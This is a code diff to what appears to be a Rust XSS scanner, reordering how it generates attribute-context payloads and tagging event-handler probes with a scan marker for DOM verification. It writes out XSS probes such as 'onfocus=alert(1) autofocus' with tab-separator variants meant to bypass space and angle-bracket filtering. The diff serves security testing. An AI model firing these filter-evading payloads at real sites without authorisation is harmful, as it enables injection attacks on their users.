@@ -27,10 +27,16 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
                     for payload in html_payloads.iter() {
                         payloads.push(format!("'>{}'", payload));
                     }
-                    for payload in attr_payloads.iter() {
-                        payloads.push(format!("' {} a='", payload));
-                    }
-                    // Self-triggering event handler payloads (work even when < > are filtered)
+                    // Self-triggering event handler payloads (work even when < > are filtered).
+                    // Carry the scan's id marker so a reflection in attribute context
+                    // promotes straight to V via marker-based DOM evidence — the first
+                    // hit collapses both the reflection and DOM verification loops
+                    // together. Ordered BEFORE `attr_payloads` (marker-less event
+                    // handlers) so the first angle-free payload sent is marker-
+                    // carrying — critical on servers that strip `<` / `>`, where
+                    // every prior payload that lacks a marker only yields [R] and
+                    // drains the DOM verification budget.
+                    let id_marker = crate::scanning::markers::id_marker();
                     let autotrigger_events = [
                         "onfocus=alert(1) autofocus",
                         "onmouseover=alert(1)",
@@ -42,9 +48,12 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
                         "onslotchange=alert(1)",
                     ];
                     for ev in &autotrigger_events {
-                        payloads.push(format!("' {} '", ev));
+                        payloads.push(format!("' {} id={} '", ev, id_marker));
                         // Tab separator variant (bypasses space filtering)
-                        payloads.push(format!("'\t{}\t'", ev));
+                        payloads.push(format!("'\t{}\tid={}\t'", ev, id_marker));
+                    }
+                    for payload in attr_payloads.iter() {
+                        payloads.push(format!("' {} a='", payload));
                     }
                     if !url_like {
                         // Protocol payloads for src/href attributes (e.g. iframe src='VALUE')
@@ -61,10 +70,12 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
                     for payload in html_payloads.iter() {
                         payloads.push(format!("\">{}\"", payload));
                     }
-                    for payload in attr_payloads.iter() {
-                        payloads.push(format!("\" {} \"", payload));
-                    }
-                    // Self-triggering event handler payloads (work even when < > are filtered)
+                    // Self-triggering event handler payloads (work even when < > are filtered).
+                    // Marker-carrying so the first reflecting payload also DOM-verifies
+                    // and the scanner short-circuits both loops in a single round-trip.
+                    // Ordered BEFORE `attr_payloads` so the first angle-free payload
+                    // sent is marker-carrying — see SingleQuote branch for full rationale.
+                    let id_marker = crate::scanning::markers::id_marker();
                     let autotrigger_events = [
                         "onfocus=alert(1) autofocus",
                         "onmouseover=alert(1)",
@@ -76,9 +87,12 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
                         "onslotchange=alert(1)",
                     ];
                     for ev in &autotrigger_events {
-                        payloads.push(format!("\" {} \"", ev));
+                        payloads.push(format!("\" {} id={} \"", ev, id_marker));
                         // Tab separator variant (bypasses space filtering)
-                        payloads.push(format!("\"\t{}\t\"", ev));
+                        payloads.push(format!("\"\t{}\tid={}\t\"", ev, id_marker));
+                    }
+                    for payload in attr_payloads.iter() {
+                        payloads.push(format!("\" {} \"", payload));
                     }
                     if !url_like {
                         // Protocol payloads for src/href attributes (e.g. iframe src="VALUE")
